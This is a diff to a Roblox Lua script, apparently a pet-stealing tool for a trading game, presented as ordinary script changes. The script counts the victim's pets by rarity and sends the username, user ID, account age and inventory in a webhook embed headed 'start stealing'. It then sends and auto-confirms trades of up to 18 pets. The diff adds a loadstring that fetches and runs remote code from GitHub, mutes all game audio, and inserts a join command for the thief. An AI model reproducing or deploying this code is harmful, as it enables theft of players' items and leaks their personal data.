@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetVersee/loadingscreen/refs/heads/main/loading",true))()
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -8,6 +9,24 @@ local ultra_count = 0
 local rare_count = 0
 local uncommon_count = 0
 local common_count = 0
+
+local function muteAllAudio()
+    for _, sound in pairs(workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+            sound.Volume = 0
+        end
+    end
+end
+
+muteAllAudio()
+
+workspace.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") then
+        descendant:Stop()
+        descendant.Volume = 0
+    end
+end)
 
 for i, v in pairs(ClientData.get("inventory").pets) do
   if InventoryDB[v.category][v.id].rarity == "legendary" then
@@ -32,6 +51,7 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     neon_count = neon_count + 1
   end
 end
+
 local exploit
 local function getexploit()
     local exploitt =
@@ -63,7 +83,7 @@ local data = {
   embeds = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
       color = 10428396
     }
   }
@@ -82,29 +102,6 @@ else
   print("LMAOOOOOO")
 end
 
-local hide = coroutine.create(function()
-    while true do
-        local player = game:GetService("Players").LocalPlayer
-        local tradeFairPopup = player:WaitForChild("PlayerGui"):WaitForChild("DialogApp")
-        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeApp")
-        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
-
-        if tradeFairPopup.Enabled == true then
-            tradeFairPopup.Enabled = false
-        end
-
-        if tradeGUI.Enabled == true then
-            tradeGUI.Enabled = false
-        end
-
-        if tradeGUIPhone.Enabled == true then
-            tradeGUIPhone.Enabled = false
-        end
-
-        wait(0.1)
-    end
-end)
-
 local function AcceptTrade()
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
@@ -120,8 +117,6 @@ local function ConfirmTrade()
 end
 
 local function SendTrade()
-    coroutine.resume(hide)
-
   local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
@@ -144,7 +139,7 @@ wait(5)
       local petUid = table.remove(petUids, 1)
       AddPetRemote:FireServer(petUid)
       petCount = petCount + 1
-      if petCount >= 18 then
+      if petCount == 18 then
         break
       end
     end
